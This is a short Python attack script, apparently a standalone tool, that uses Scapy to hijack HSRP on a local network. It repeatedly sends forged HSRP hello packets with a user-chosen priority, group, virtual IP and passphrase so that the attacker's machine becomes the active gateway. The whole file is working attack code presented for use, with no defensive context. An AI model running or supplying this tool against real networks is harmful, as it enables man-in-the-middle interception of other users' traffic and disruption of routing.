#!/usr/bin/env python3


#Import Scapy & HSRP
from logging import info
from scapy.all import *
from scapy.layers.hsrp import *
import argparse

HSRPMulticast = "224.0.0.2"

print ("#by C0ldheim")

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", type=str, dest="interface", required=True, help="Choose your interface")
    parser.add_argument("-ip", type=str, dest="attackerip", required=True, help="Choose your IP")
    parser.add_argument("-g", type=int, dest="group", required=True, help="Choose HSRP Group Value")
    parser.add_argument("-p",  type=int, dest="priority", required=True, help="Choose HSRP Priority Value")
    parser.add_argument("-vip", type=str, dest="virtualip", required=True, help="Choose the HSRP Virtual Router IP  ")
    parser.add_argument("-auth", type=str, dest="auth", required=True, help="Choose the auth HSRP passphrase. (default: cisco)")
    args = parser.parse_args()

    return args



def hijacking(interface, attackerip, group, priority, virtualip, auth):
    ip = IP(src=args.attackerip, dst=HSRPMulticast, ttl=1)
    udp = UDP(sport=1985, dport=1985)
    hsrp = HSRP(group=args.group, priority=args.priority, virtualIP=args.virtualip, auth=args.auth)
    malicious_hsrp = ip/udp/hsrp
    send(malicious_hsrp, iface=args.interface, inter=3, loop=1)



args = get_arguments()
hijacking(args.interface, args.attackerip, args.group, args.priority, args.virtualip, args.auth)




